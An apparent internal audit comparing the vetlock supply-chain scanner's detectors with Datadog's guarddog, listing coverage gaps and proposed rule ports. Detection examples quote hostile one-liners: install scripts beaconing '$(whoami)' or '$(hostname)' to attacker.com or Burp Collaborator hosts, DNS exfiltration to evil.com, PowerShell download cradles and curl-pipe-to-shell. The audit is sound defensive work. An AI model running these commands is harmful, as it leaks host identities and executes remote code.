# guarddog vs vetlock — comparative audit

**Status:** landed by Wave 7-GG. **Closure markers** (`**CLOSED (Wave 8-XX, SHA <TBD>):**`) below are stamped by the wave that ports the corresponding detector or architectural insight; SHAs are back-filled when Wave 8-KK / 8-LL / 8-MM merge into `main`. Until then, the SHA placeholder is `<TBD>` and integration status is tracked in `ROADMAP.md` under the Wave 8 section.
**guarddog source read:** `github.com/DataDog/guarddog@main` (shallow clone, 2026-07-15).
**vetlock source read:** this worktree, `origin/main` at start of Wave 7-GG.
**Companion adapter:** `assurance/src/differential/guarddog.ts` (differential ledger participant).

## Why this audit exists

Datadog's [guarddog](https://github.com/DataDog/guarddog) (Apache-2.0, Python) is the closest open-source peer to vetlock. It is an actively-maintained supply-chain scanner that ships to Datadog's own Cloud SIEM content pack, so its detector set is the best available snapshot of what a well-funded blue team considers table-stakes for a package-registry threat feed. This document exists so vetlock's coverage claims can be measured against that snapshot honestly — no hand-waving.

The layout follows the packet's audit doctrine: cite the actual rule file, decide "real gap or intentional-non-goal", make it recoverable by a stranger.

## Architectural summary — the shapes at a glance

|                      | vetlock                                                                                            | guarddog                                                                                          |
| :------------------- | :------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------ |
| Primary input        | Lockfile diff (before/after) + fetched tarballs on both sides                                      | Single package version (tarball or `.tar.gz` local path)                                          |
| Language of detectors | TypeScript, AST-driven via `@babel/parser` reachable from `capabilities.ts`                        | YARA rules over source bytes (54 `.yar` files) + Python metadata detectors (~9 heuristics)         |
| Ecosystems           | npm (primary), PyPI (parity via `packages/core/src/adapter-pypi.ts` and detectors' `python-*` families) | PyPI, npm, Go modules, RubyGems, GitHub Actions, VSCode extensions                              |
| Correlation model    | Compound suspicion (co-occurrence → severity escalation) in `packages/detectors/src/index.ts`      | Capability-plus-Threat risk engine (`guarddog/analyzer/risk_engine.py`), MITRE-ATT&CK-tagged     |
| Behavioral framing   | **Diff-native**: something MUST have changed vs the previous version to fire (most detectors)     | Point-in-time: every version scans the whole source tree fresh                                     |
| Runtime harness      | `@vetlock/assurance` — robustness + completeness suite + differential ledger                       | `tests/analyzer/*` YARA-rule unit tests + eval samples; kernel sandbox around extraction (Landlock/Seatbelt) |
| Output               | Findings + severities + defanged evidence + differential ledger deltas                             | JSON / SARIF / prettytable; risk score 0-10; MITRE tactics on every finding                        |

---

## §1 Detector-idea gaps — what guarddog catches that vetlock doesn't

Each entry cites the guarddog rule file (path relative to their repo root), states the gap, and classifies:

- **REAL GAP** — vetlock's scope covers this shape but no detector fires; file a coverage bug.
- **INTENTIONAL NON-GOAL** — outside vetlock's design (protestware, non-npm/PyPI, runtime-only signals with no diff surface).
- **PARTIAL** — vetlock catches part of the shape; the delta is a specific sub-case.

### 1.1 Obfuscation

#### G-01. **CLOSED (Wave 8-KK, SHA <TBD>):** JavaScript variable-name mangling (`_0x[hex]{4,6}` pattern)

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-js-mangling.yar` (`identifies=threat.runtime.obfuscation.js.mangling`, severity=medium).
- **What it catches:** the tell-tale `_0x1a2b3c` variable naming that `javascript-obfuscator`, `obfuscator.io`, and other commercial JS obfuscators emit — plus the UTF-16LE encoded variant that npm's own scanning historically missed.
- **vetlock today:** `packages/detectors/src/obf.ts` fires on entropy jump + suspicious literal density but does not specifically look for the `_0x` mangling signature. A tarball newly shipping `_0x`-mangled files that stay under the entropy threshold (e.g. only the top of a large file is mangled) would slip.
- **Classification:** **REAL GAP.** Add `obf.js-mangler-signature` as a diff-mode detector: scan every added/modified `.js|.mjs|.cjs|.ts` in `pair.new` for ≥3 distinct `_0x[a-f0-9]{4,6}\b` identifiers. First-version-cluster mode: fire on any first-published file that contains ≥3. Cheap regex, high precision — Datadog's own eval samples show near-zero false positives on legit code.

#### G-02. **CLOSED (Wave 8-LL, SHA <TBD>):** Base64-decode-then-exec pair, cross-language

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-base64exec.yar` (severity=high).
- **What it catches:** the paired shape `base64.b64decode(...)` + `exec(` / `eval(` (Python), `atob(...)` + `eval()` (JS), `Buffer.from(x, 'base64')` + `new Function(...)`. The pair — not either alone — is what fires.
- **vetlock today:** `net-encoded.ts` catches base64-encoded URL literals; `code.ts` fires on `new Function` and dynamic `eval`; but the **co-occurrence-in-same-file** signal that guarddog uses is not stitched together as one detector. It falls out of vetlock's compound-suspicion escalator only if both `obf` and `code` fire on different lines in different files — the tightly-paired same-file case has no single named signal.
- **Classification:** **PARTIAL.** vetlock catches it indirectly through compound suspicion; guarddog packages it as a single high-severity rule with defanged file-path evidence. Adding `obf.base64-then-exec` as a per-file same-scope pair detector would tighten evidence quality.

#### G-03. **CLOSED (Wave 8-LL, SHA <TBD>):** Steganography — decode-then-exec after image/data-URL

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-steganography.yar` (severity=high).
- **What it catches:** payload hidden inside an image (`.png`, `.jpg`, `.bmp`) or `data:` URL, followed by a decoder call feeding into `exec`/`eval`. Real-world example: the March 2024 `pytoileur`/`typosquat` waves.
- **vetlock today:** no detector for image-shipped payload. Bundled binary detector (`bundled.ts`) flags standalone `.node`/`.so`/`.dll` files but not decoder-consumed image data.
- **Classification:** **REAL GAP** (small class, but genuine). npm packages have shipped this shape too. Cheap to add: `obf.image-decode-exec` — file added to `pair.new` under a suspicious extension (`.png/.jpg/.webp/.gif`) that is `require()`d or `readFileSync`d in an added `.js` file whose immediate downstream is `atob`/`Buffer.from` piped to `eval`/`new Function`.

#### G-04. **CLOSED (Wave 8-KK, SHA <TBD>):** Unicode homoglyph obfuscation

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-runtime-obfuscation-unicode.yar` (severity=medium).
- **What it catches:** Cyrillic/Greek letters adjacent to ASCII inside identifiers or strings (e.g. `pаypal` with a Cyrillic `а`), or zero-width chars wedged between ASCII letters as an invisible-splitter obfuscation.
- **vetlock today:** vetlock's `typo.ts` normalizes package NAMES but the SOURCE-CODE homoglyph channel (identifier-level or string-literal-level) is not scanned.
- **Classification:** **REAL GAP.** This is a diff-safe signal — a package that never shipped Cyrillic in an identifier suddenly shipping one is exactly what a lockfile-diff engine should catch. Add `obf.unicode-homoglyph-boundary` — detect ASCII↔Cyrillic/Greek/Math boundary chars in added/modified JS/TS files.

### 1.2 Network / exfiltration

#### G-05. **CLOSED (Wave 8-LL, SHA <TBD>):** DNS-based exfiltration via constructed hostnames

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-network-dns-exfil.yar` (severity=high, MITRE=exfiltration).
- **What it catches:** `socket.getaddrinfo(f"{data}.evil.com")` (f-string interpolation) or `nslookup ${VAR}.attacker` — encoding stolen data into DNS query subdomains to bypass HTTP egress filters. This is the shape used by dependency-confusion probes (Burp Collaborator, oastify, `interact.sh`, canarytokens, dnslog).
- **vetlock today:** `net.new-module` fires on `import dns` / `require('dns')`, and `net-encoded.ts` flags base64-encoded URLs — but neither catches the specific "hostname constructed with template interpolation feeding a DNS lookup" pattern, nor the `curl ${VAR}.beacon` shell-shape.
- **Classification:** **REAL GAP** (small but historically important — this is exactly the beaconing shape used by pentest / bug-bounty probes and by dep-confusion attackers). Add `net.dns-templated-hostname` — AST-level: `dns.lookup`/`dns.resolve` / `getaddrinfo` called with a `TemplateLiteral` or `BinaryExpression('+')` argument.

#### G-06. Reverse-shell fingerprints

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-network-reverse-shell.yar` (severity=high).
- **What it catches:** the canonical reverse-shell shapes across Python (`socket.SOCK_STREAM` + `subprocess.call('/bin/sh')`), JS (`net.connect` + `child_process.spawn('/bin/sh')`), and Ruby.
- **vetlock today:** vetlock catches the two ingredients separately — `net.new-module` + `exec.new-module` — and compound-suspicion escalates when they co-occur. The rand-user-agent 2025 fixture (`corpus/rand-user-agent-2025`) exercises this successfully. But vetlock does not emit a single named `net.reverse-shell` signal — the analyst has to read the compound findings and infer "these together = reverse shell".
- **Classification:** **PARTIAL.** Coverage exists, evidence quality is worse. Adding `net.reverse-shell-shape` as a synthesized detector (`net.new-module` + `exec.new-module` + `/bin/sh` literal or `-i` shell flag in the same file) would give the analyst a single-line signal.

#### G-07. HTTP dependency in `package.json`

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-npm-http-dependency.yar` (severity=high, MITRE=initial-access).
- **What it catches:** a `package.json` whose `dependencies` values include `"http://…"`, `"https://.../foo.tgz"`, or `"https://<IP>/…"` — a supply-chain footgun (dependency confusion, untrusted CDN, non-immutable install).
- **vetlock today:** vetlock reads lockfiles, not raw `package.json` dependency URLs. Direct URL deps are rare in resolved lockfiles because `package-lock.json` records a resolved tarball URL, but `resolved: "https://…"` pointing to an arbitrary CDN in a lockfile is worth flagging.
- **Classification:** **REAL GAP** (partial). Add `manifest-deps.http-resolved-url` — parse the resolved URL of every added transitive dep in `package-lock.json`; flag any host that is NOT `registry.npmjs.org` / `registry.yarnpkg.com` / a configured private registry, and any plain-`http://` value.

#### G-08. Dependency-confusion probe (DNS callback in scripts)

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-npm-dependency-confusion.yar` (severity=high).
- **What it catches:** `preinstall` / `install` / `postinstall` scripts that shell out to `curl https://xyz.burpcollaborator.net/$(hostname)` or `nslookup $(whoami).attacker.com`. This is the classic Alex Birsan dependency-confusion probe shape.
- **vetlock today:** `install.ts` fires when the script changed; `env.ts` fires when env-vars are read; but the specific "install script contains `whoami`/`hostname` piped into an outbound DNS or HTTP call" pattern is not called out as a single high-severity signal. A minimalist `preinstall: "curl $(whoami).attacker.com"` would fire only `install.script-added` at BLOCK severity — no analyst hint at the exfil channel.
- **Classification:** **PARTIAL.** Coverage exists, evidence quality is worse. Add `install.script-dep-confusion-shape` — string-inspect the `pair.new` install-tier script for `$(whoami)`, `$(hostname)`, `${USER}`, or a `.burpcollaborator|oastify|interact|canarytokens|dnslog` domain literal.

### 1.3 Process / execution

#### G-09. Cryptomining fingerprints

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-process-cryptomining.yar` (severity=high).
- **What it catches:** direct calls to `xmrig`, `minexmr.com`, `stratum+tcp://`, `--donate-level`, `cryptonight`, `randomx` and other pool/protocol fingerprints. The ua-parser-2021 incident (`corpus/ua-parser-2021`) is the canonical example.
- **vetlock today:** vetlock catches `ua-parser-2021` through the combined install-hook + new-network-module + new-endpoint signals. But there is no `net.cryptomining-endpoint` detector that fires just on the pool-URL literal or the `stratum+tcp://` scheme.
- **Classification:** **INTENTIONAL NON-GOAL for now, but cheap addition.** vetlock's design says "we detect the capabilities and let the analyst classify"; a cryptomining-specific detector is a UX affordance, not a new coverage class. Nice-to-have as `net.cryptomining-endpoint` (URL substring match against a short list of stratum protocol prefixes) — INFO severity, exists to name the shape.

#### G-10. PowerShell encoded-command / download cradle

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-process-powershell-encoded.yar` (severity=high).
- **What it catches:** `powershell -enc <base64>`, `powershell -w hidden`, `iex (New-Object Net.WebClient).DownloadString(...)`.
- **vetlock today:** `exec.ts` fires on any `child_process.exec` call new to the diff, but the Windows-specific PowerShell fingerprint is not called out separately.
- **Classification:** **PARTIAL.** Coverage exists via `exec.new-module` + compound suspicion. Naming it as a single rule would improve evidence quality for the Windows-targeting attack shape. Low priority (npm supply chain rarely ships Windows-only payload without a corresponding preinstall hook that already trips BLOCK).

#### G-11. Download-then-execute pattern

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-process-download-exec.yar` (severity=high).
- **What it catches:** `curl … | sh`, `wget -O - … | bash`, or the programmatic version — `fetch(url).then(r=>r.text()).then(eval)`.
- **vetlock today:** the pieces trip separately (`net.new-module` + `code.dynamic-loading-added`), and compound suspicion escalates the pair. Not called out as a named signal.
- **Classification:** **PARTIAL.** Same story as G-06 / G-10 — coverage exists, evidence quality could be better. Adding `net.download-then-exec-pair` for the AST shape `fetch(URL)` → `.text()` → `eval`/`Function`/`vm.runIn*Context` in one dataflow (or the shell `| sh` literal in an install script) tightens the story.

### 1.4 Setup / install-time (Python-specific)

#### G-12. Suspicious imports in `setup.py`

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-setup-suspicious-imports.yar` (severity=high).
- **What it catches:** `setup.py` importing `socket`, `subprocess`, `os.system`, `requests`, `urllib` — libraries that have no legitimate business in a build script.
- **vetlock today:** `python-install-hook` detector (`setup-py-cmdclass` capability) fires on custom `cmdclass` in `setup.py` but does not classify by imports the file makes.
- **Classification:** **PARTIAL.** Adding an AST-level import scan on the `setup.py` in `pair.new` (any added `import socket|subprocess|requests|urllib|http.client` in a `setup.py` that wasn't present before → BLOCK) would tighten the Python side to match guarddog's specificity.

#### G-13. Network activity in `setup.py`

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-setup-network-in-install.yar` (severity=high).
- **What it catches:** `setup.py` files that make actual network calls at install time (not just imports).
- **vetlock today:** overlaps with G-12; the imports are what get flagged, the actual call is not.
- **Classification:** **PARTIAL** (dovetails with G-12).

#### G-14. `setup.py` import aliasing

- **guarddog rule:** `guarddog/analyzer/sourcecode/threat-setup-import-aliasing.yar` (severity=high).
- **What it catches:** aliasing dangerous callables (`from os import system as s`, `exec = __builtins__.exec`) — an evasion trick against string-match detectors.
- **vetlock today:** vetlock's `python-code-exec` catches `exec`/`eval` at the AST level, not string-match, so aliasing does not defeat it directly. However, `setup.py`-scoped aliasing is not called out separately.
- **Classification:** **INTENTIONAL NON-GOAL.** vetlock catches this in the general AST-obfuscation family; the setup-py-specific naming is a UX affordance.

### 1.5 Package metadata

#### G-15. **CLOSED (Wave 8-KK, SHA <TBD>):** Deceptive-author heuristic (disposable email domain)

- **guarddog rule:** `guarddog/analyzer/metadata/deceptive_author.py` (severity=medium, MITRE=initial-access).
- **What it catches:** author email domain is on a known disposable-mail list (`mailinator.com`, `guerrillamail.com`, `10minutemail.com`, and ~200 more).
- **vetlock today:** `meta.ts` catches maintainer-CHANGE, not maintainer-identity-quality. A first-published package by `attacker@mailinator.com` clears vetlock's meta detector because there is no diff.
- **Classification:** **REAL GAP.** Add `meta.disposable-author-domain` for `pair.new.manifest.author.email` (and `maintainers[*].email`). Trigger: WARN severity, gets escalated to BLOCK when the package is first-published AND has BLOCK-tier capabilities. Cheap: ship a bundled list of ~100 major disposable-domain services.

#### G-16. Unclaimed maintainer email domain

- **guarddog rule:** `guarddog/analyzer/metadata/unclaimed_maintainer_email_domain.py` (severity=high).
- **What it catches:** the domain of a maintainer's email is available for registration (or has no MX record), meaning an attacker could register it and password-reset the npm account.
- **vetlock today:** not covered. Requires a DNS lookup at scan time — non-diffing, network-dependent.
- **Classification:** **INTENTIONAL NON-GOAL** for vetlock's synchronous / offline design (packet §2.3, "network-optional"). Would live in a separate enrichment stage if we ever added one.

#### G-17. Bundled binary in a package that shouldn't have one

- **guarddog rule:** `guarddog/analyzer/metadata/bundled_binary.py` (severity=medium).
- **What it catches:** package ships a `.exe`, `.dll`, `.dylib`, `.so`, or ELF/Mach-O binary that isn't declared as a native module.
- **vetlock today:** `bin.ts` (`bin.new-native-artifact`) catches new `.node`/`.so`/`.dylib`/`.dll` files added in `pair.new` and treats them as high-severity. This IS covered.
- **Classification:** **COVERED.** vetlock parity.

#### G-18. Metadata-manifest mismatch

- **guarddog rule:** `guarddog/analyzer/metadata/metadata_mismatch.py` (severity=medium, MITRE=execution).
- **What it catches:** package registry metadata says one thing (declared version, name, README) but the actual manifest inside the tarball says another. Used to detect prepared-package + last-minute-swap attacks.
- **vetlock today:** not covered. vetlock consumes lockfiles which point at resolved tarball URLs, doesn't cross-check the registry-metadata-vs-tarball-manifest agreement.
- **Classification:** **INTENTIONAL NON-GOAL** for the diff engine. Belongs on the registry-mirror side, not the consumer side; the packet is explicit about vetlock running on the consumer (lockfile-diff) rather than the registry.

#### G-19. Repository-integrity mismatch (git repo vs published tarball)

- **guarddog rule:** `guarddog/analyzer/metadata/repository_integrity_mismatch.py` (severity=high).
- **What it catches:** the package declares a GitHub repo but ships files (or file hashes) that don't match what's in the repo. This is exactly how the 2018 event-stream / flatmap-stream and 2021 ua-parser-js takeovers were retroactively spotted.
- **vetlock today:** not covered. Requires cloning the repo and diffing against the tarball — heavy.
- **Classification:** **INTENTIONAL NON-GOAL** (out-of-band enrichment; would double scan time and require network + git access). Worth calling out as a documented gap for users who want a second layer.

### 1.6 Typosquatting

#### G-20. **CLOSED (Wave 8-KK, SHA <TBD>):** Levenshtein + swap + hyphen-permutation against Top-5000

- **guarddog rule:** `guarddog/analyzer/metadata/typosquatting.py` (severity=high).
- **What it catches:** four flavors — Levenshtein-1, single-character transposition, hyphen-permutation (e.g. `foo-bar` vs `bar-foo`), and confused-form (e.g. `re-quests` vs `requests`).
- **vetlock today:** `typo.ts` uses Damerau-Levenshtein against the Top-1000 (see `top-npm-names.ts`); scope-prefix typosquats added by S6 fix. Hyphen-permutation is NOT covered — vetlock would treat `foo-bar` vs `bar-foo` as edit-distance-N (large), missing the class entirely.
- **Classification:** **REAL GAP** (small class but well-known — dep confusion probes routinely try `<company>-cli` vs `cli-<company>`). Add hyphen-permutation check in `typo.ts` — split on `-`, sort tokens, compare token-set equality with Top-1000. Runs at most once per newly-added package.

---

## §2 Architectural insights vetlock can absorb

### 2.1 **CLOSED (Wave 8-MM, SHA <TBD>):** Explicit MITRE ATT&CK tactic on every finding

**guarddog does this:** every rule declares `mitre_tactics = "..."` (initial-access / execution / persistence / defense-evasion / credential-access / discovery / lateral-movement / collection / command-and-control / exfiltration / impact). Findings render grouped by attack STAGE (Initial execution / Post-compromise / Exfiltration).

**vetlock today:** findings carry `category` (`NET`, `INSTALL`, `EXEC`, `OBF`, `META`, `FS`, `ENV`, `META`, `INTEGRITY`, `TYPO`, `META`, `PUBLISHER`, `ADVISORY`, `PYTHON-*`) — vetlock-internal buckets, not the industry-standard MITRE taxonomy.

**Recommendation:** add an optional `mitreTactics: readonly string[]` field on `Finding` and populate it in each detector. Report layer maps MITRE tactic → analyst-friendly stage label. Downstream: SIEM integrations (Datadog, Splunk, Sentinel) all speak MITRE natively.

### 2.2 **CLOSED (Wave 8-MM, SHA <TBD>):** Risk score compression (0–10) with a documented weighting

**guarddog does this:** four-factor scoring (severity 30% + attack-chain-completeness 20% + specificity 30% + sophistication 20%). Score bands: 0 / 0.1–3 / 3.1–7.5 / 7.6–10 with a plain-English label. Every rule declares its own `specificity` and `sophistication` (low/medium/high) so the numbers are traceable.

**vetlock today:** findings carry a `severity` (`INFO`/`WARN`/`BLOCK`) plus `confidence` (`low`/`medium`/`high`). No aggregate package-level score.

**Recommendation:** either (a) add a package-level score (0–10) with a documented weight so users can set `--fail-above 7.5` in CI, or (b) explicitly document that vetlock chose per-finding gating over aggregation and cite the packet reasoning. Either answer is defensible; the current silence isn't.

### 2.3 Rule-file-based detectors instead of code-file-based

**guarddog does this:** every source-code detector is a `.yar` file with metadata, strings, and a condition. Adding a new detector is a one-file PR that the CI's YARA linter validates before merge. Writing a rule requires only YARA — no Python change.

**vetlock today:** each detector is a hand-authored TS file with AST traversal logic. The AST-driven approach is more precise (guarddog can't do dataflow across two YARA files); the trade is a higher bar to add a new signal.

**Recommendation:** don't switch — the AST approach is a genuine advantage (see §3). BUT: for the low-precision "flag-if-substring-exists" rules (G-05 templated-hostname, G-15 disposable-domain, G-20 hyphen-permutation) a lightweight declarative-rule loader (regex + severity + label, one JSON file per rule) would let coverage grow without a per-rule code review. Split the rule surface: AST-driven detectors for behavioral signals, declarative rule files for string-fingerprint signals.

### 2.4 Extraction sandbox by default

**guarddog does this:** package archive extraction runs inside a Linux Landlock / macOS Seatbelt sandbox with network blocked and filesystem restricted. Default: sandbox required, scan FAILS if unavailable. `--no-sandbox` must be passed explicitly.

**vetlock today:** `assurance` has a runtime sandbox harness for robustness testing but the engine's own `extract.ts` runs in-process with no sandbox. Threat model bet: vetlock doesn't extract arbitrary tarballs — it operates on lockfile bytes + fetched tarball bytes that npm has already extracted for the developer. The bet is defensible in the standard workflow but breaks the moment `vetlock scan <tarball-URL>` becomes a supported entry point (roadmap: unclear).

**Recommendation:** document the current threat model explicitly in `SECURITY.md` (already exists), and if any tarball-scanning entry point is added, adopt a Landlock/Seatbelt-style sandbox before shipping it. Consider gating the extraction path behind a `--allow-extract` flag with a warning today, to avoid a stealth expansion of the trust surface.

### 2.5 **CLOSED (Wave 8-MM, SHA <TBD>):** SARIF output as a first-class format

**guarddog does this:** SARIF is a supported `--output-format` and the guarddog GitHub Action uploads SARIF to GitHub Code Scanning by default. Users get PR comments and false-positive management for free.

**vetlock today:** action.yml exists; SARIF is not the default. GitHub Advanced Security integration works better with SARIF.

**Recommendation:** add SARIF as a reporter (mirror `assurance/report/*` shape). Ties directly to §2.1 — SARIF slots MITRE tactics into `properties.tags`.

### 2.6 FP-tuning via a corpus of top packages

**guarddog does this:** `tests/samples` contains hand-curated malicious samples PLUS a benchmark against legitimate top packages. Every new rule is measured against both — high signal + low false positive.

**vetlock today:** `assurance/corpus/fp-smoke/` exists (routine-bump study) plus `corpus/` (real incidents). This is the pattern already; direction is right, coverage of legit packages could be broader (the fp-study is 27 bumps).

**Recommendation:** grow `corpus/fp-smoke/` to 100+ routine-bump pairs from the actual npm top-500 (mechanical: for each package, take the last two shipped versions with resolved tarballs). Ratchet a "false-positive rate above X% blocks the PR" metric in the assurance report.

---

## §3 What vetlock does better than guarddog

Not everything is a gap to close. Recording where vetlock is genuinely ahead so future contributors don't roll it back.

### 3.1 Diff-native design

guarddog scans a SINGLE version of a package end-to-end. It cannot say "this URL literal is NEW in v2.0.5 vs v2.0.4"; every finding is a point-in-time observation.

vetlock's `SnapshotPair` model treats every signal as a diff — added module, added script, added endpoint, added maintainer. Legitimate packages ship a lot of network calls, install scripts, and URL literals; the SIGNAL is the DELTA, not the total.

This is a real product bet that the packet documents (`§2.2 modality`, `§7 CLASSIFY HONESTLY`). guarddog's approach forces manual triage on every "capability" hit; vetlock's approach fires only when the capability itself changed.

### 3.2 Compound-suspicion escalator

vetlock's `runAll()` in `packages/detectors/src/index.ts` explicitly encodes: `net.new-endpoint` alone → WARN; `net.new-endpoint` + `install.script-added` → BLOCK. The escalation table lives in one place; every co-occurrence rule is testable in isolation.

guarddog's risk engine does something similar (capability + threat pairing) but the pairing is baked into per-file scoring and expressed only in `guarddog/analyzer/risk_engine.py` — harder to reason about, harder to add rules to.

### 3.3 Capability-map + coverage gate

`packages/detectors/src/capability-map.json` explicitly enumerates every capability class × sink × detector × test × corpus-ref. The `capability-map.test.ts` CI gate REFUSES to merge a change that adds a new capability without a matching corpus fixture, refuses `soft_warn_no_corpus: true` without a manifest note, and refuses a detector edit without a corresponding test file. This is completeness-as-a-CI-check and is not a thing guarddog has.

### 3.4 Assurance layer (this repository's `assurance/` package)

Robustness corpus (deep-nested YAML, gzip bombs, tar bombs, ReDoS probes) with an in-repo runner that ratchets the safety envelope. Differential ledger that hard-fails silent competitor hits. Corpus of real historical incidents (10 fixtures) whose behavioral signals must fire — completeness by demonstration, not by design intent.

guarddog has `tests/samples` but no analogous "any competitor hit we don't produce must be classified and named" mechanism.

### 3.5 Trust-store aware maintainer detector

vetlock's `meta.ts` + `publishers.ts` distinguish "trusted publisher rotation on a well-known package" (INFO) from "unknown maintainer taking over a trusted package" (BLOCK), driven by a bundled `BUILTIN_TRUST_STORE` and a user-side `.vetlock.json` `trustedPublishers` list. guarddog's metadata detectors are per-heuristic and don't stack this way.

### 3.6 Python parity via detectors, not just YARA

`packages/detectors/src/` contains `python-net-egress`, `python-env-access`, `python-code-exec`, `python-install-hook`, `python-supply-chain` families that are AST-driven (via the pypi adapter). guarddog's Python-side detectors are YARA — strong on false positives, weak on control-flow reasoning. vetlock's approach is a longer-term bet with higher precision at the cost of harder-to-write detectors.

---

## §4 Detector-rule ports worth trying (near-1:1 translations)

If any of these convert cleanly into a vetlock detector, they land as new signals in `packages/detectors/src/*.ts` under a clearly-labeled `port from guarddog:<rule-id>` comment. All are diff-safe (new pattern in `pair.new` that wasn't in `pair.old` — or, for first-version-cluster mode, present in a freshly-published package).

| # | guarddog rule id                                             | vetlock detector id (proposed)     | Shape                                                                                     | Effort |
| :-- | :----------------------------------------------------------- | :--------------------------------- | :---------------------------------------------------------------------------------------- | :----: |
| 1 | `threat-runtime-obfuscation-js-mangling`                     | `obf.js-mangler-signature`         | Regex ≥3 distinct `_0x[a-f0-9]{4,6}` in added/modified `.js|.ts|.mjs|.cjs`                | Low    |
| 2 | `threat-npm-preinstall-script` (already covered) + shape scan | `install.script-dep-confusion-shape` | Install-tier script string contains `$(whoami)`/`$(hostname)`/`nslookup`/beacon domains  | Low    |
| 3 | `threat-runtime-obfuscation-unicode`                         | `obf.unicode-homoglyph-boundary`   | Cyrillic/Greek codepoint adjacent to ASCII letter in identifier/string, in JS or Python  | Low    |
| 4 | `threat-network-dns-exfil`                                   | `net.dns-templated-hostname`       | `dns.lookup|resolve` / `getaddrinfo` / `gethostbyname` called with a template literal    | Medium |
| 5 | `threat-runtime-obfuscation-base64exec`                      | `obf.base64-then-exec`             | Base64-decode primitive and `exec`/`eval`/`Function`/`vm.*` in same file (AST scope)     | Medium |
| 6 | `typosquatting` (hyphen-permutation branch)                  | `typo.hyphen-permutation`          | Split newly-added package name on `-`, sort tokens, compare token-set to Top-1000        | Low    |
| 7 | `deceptive_author`                                           | `meta.disposable-author-domain`    | Author/maintainer email domain in bundled disposable-domain list                          | Low    |
| 8 | `threat-npm-http-dependency`                                 | `manifest-deps.http-resolved-url`  | Non-registry / plain-http `resolved:` URL in `package-lock.json` for a newly-added dep    | Low    |
| 9 | `threat-runtime-obfuscation-steganography`                   | `obf.image-decode-exec`            | New image asset in `pair.new` that is `require`d/`readFileSync`d then decoded then `eval` | Medium |
| 10 | `threat-runtime-self-propagation`                            | `install.self-publish-shape`       | Package code shells out to `npm publish` / `yarn publish` + rewrites `package.json`     | Low    |

**Not worth porting** (already covered or intentional non-goal):

- `threat-runtime-obfuscation-general` — covered by `obf.entropy-jump` + `obf.suspicious-literal-density`.
- `threat-runtime-obfuscation-chr` — Python-only, covered by `python-code-exec.b64-plus-exec` family.
- `threat-runtime-obfuscation-pyarmor` — commercial tool fingerprint; niche.
- `threat-runtime-dynamic-loader` — covered by `code.dynamic-loading-added`.
- `threat-runtime-obfuscation-dynamic-eval` — covered by `code.dynamic-loading-added` + `net-encoded.ts`.
- `threat-runtime-obfuscation-hidden-code` — covered by `obf.entropy-jump`.
- `threat-runtime-obfuscation-log-suppress` — combination shape; not a strong standalone signal.
- `threat-runtime-obfuscation-import-exec` — Python-only, covered by python-code-exec family.
- `threat-runtime-obfuscation-api` — covered by `code.dynamic-loading-added` alias-form extensions.
- `threat-runtime-enumeration` / `threat-runtime-system-info` — covered by `env.ts` (env-var read) + `fs-read.ts` (host info files).
- `threat-runtime-environment-read` — covered by `env.ts`.
- `threat-runtime-screencapture` — vetlock has no browser-context detector; niche for npm supply chain.
- `threat-filesystem-destruction` — covered by `fs.ts` hot-path-write + destructive-op recognition.
- `threat-filesystem-autostart` — vetlock does not scan for autostart persistence; niche in the npm-consumer threat model.
- `threat-process-injection-dll` — Windows-specific, out of scope for the Node.js consumer surface.
- `threat-network-outbound-shady-links` — vetlock's `net.new-endpoint` + URL-context AST tagging (v0.5.0) already down-weights docs URLs; adding a shady-domain block-list is a UX affordance.
- `threat-process-hooks` / `threat-process-sysinfo` (LOLBAS hits in install hooks) — vetlock's `install.ts` + `exec.ts` compound-suspicion covers the shape.

---

## §5 Differential adapter (this wave's deliverable)

Landed alongside this audit: `assurance/src/differential/guarddog.ts`. Runs `guarddog npm scan --output-format=json <tarball-or-package>` when guarddog is on PATH; parses the `risks[]` array from guarddog's JSON output into `ScannerFinding[]`. When guarddog is unavailable (the default on CI hosts today), `isAvailable()` returns false and the pipeline never calls `scan()` — soft-fail per the differential-scanner contract.

Seeded deltas for the ten historical corpus fixtures are added to `assurance/src/differential/seeded-deltas.ts` under scanner id `guarddog`. Each cites the specific guarddog rule id that would fire and classifies as `advisory-only` (guarddog runs on published tarballs, catches the malicious version's fingerprint; vetlock catches the same incident behaviorally on the diff). One row — `colors-2022` — is `intentional-non-goal` for the same reason as the npm-audit / osv seed rows (pure protestware; no capability delta).

## §6 Meta — what to do with this audit

- **Immediate:** the differential adapter is landing; deltas are seeded; `guarddog` is now a first-class participant in the ledger.
- **Next wave candidates (P2, small scope):** ports #1, #3, #6, #7 from the §4 table. All four are ≤ 50 lines each, all four are diff-safe, all four have obvious test surfaces.
- **Next wave candidates (P3, medium scope):** ports #4, #5, #9. These need real AST work and a corpus fixture that exercises the exact shape.
- **Deferred / documented non-goals:** repository-integrity mismatch, unclaimed-maintainer-domain, sandboxed extraction — record in `SECURITY.md` under "known scope boundaries" so users considering vetlock as a sole line of defense know where the seams are.

References inside this audit are stable-linked to guarddog's `main` at the SHA of the shallow clone taken on 2026-07-15; the RULES.md excerpt used to derive the coverage matrix is at `guarddog/RULES.md` in that clone.
